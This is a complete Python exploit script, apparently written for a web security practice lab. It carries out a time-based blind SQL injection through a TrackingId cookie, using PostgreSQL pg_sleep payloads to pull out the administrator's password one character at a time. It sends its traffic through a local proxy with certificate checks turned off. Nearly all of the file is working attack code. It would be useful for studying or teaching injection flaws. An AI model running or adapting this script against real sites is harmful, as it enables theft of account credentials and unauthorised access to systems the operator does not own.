import sys
import requests
import urllib
import urllib3

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def blind_sqli_check(url,session_cookie) :
    print("(+) Starting SQLi attack to retrive admin credentials")

    password = ""
    
    for i in range(1,21):
        for char in range(32,127):
            payload = f"' || (select case when (substr(password,{i},1)='{chr(char)}') then pg_sleep(5) else '' end from users where username='administrator' ) --"
            encoded_payload =  urllib.parse.quote(payload)
            cookies = {
                "TrackingId" : encoded_payload,
                "session":session_cookie
            }

            response = requests.get(url,verify=False ,cookies=cookies,proxies=proxies)
            if response.elapsed.total_seconds() >=5:
                password += chr(char)
                sys.stdout.write('\r'+password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r'+password+chr(char))
                sys.stdout.flush
            
    
    print("\n(+) Attack Finished ...")
    print(f"(+) administrator password = '{password}'")

def main():
    if len(sys.argv) != 3 :
        print("(-) Usage: %s <url>  <session_cookie>" %sys.argv[0])
        print("(-) Example: %s https://www.example.com  \"ay_value\" " %sys.argv[0])
    
    url = sys.argv[1]
    session_cookie = sys.argv[2]
    print("(+) Checking if tracking cookie is vulnerable to time-based blind SQLi...")
    blind_sqli_check(url,session_cookie)




if __name__ == "__main__":
    main()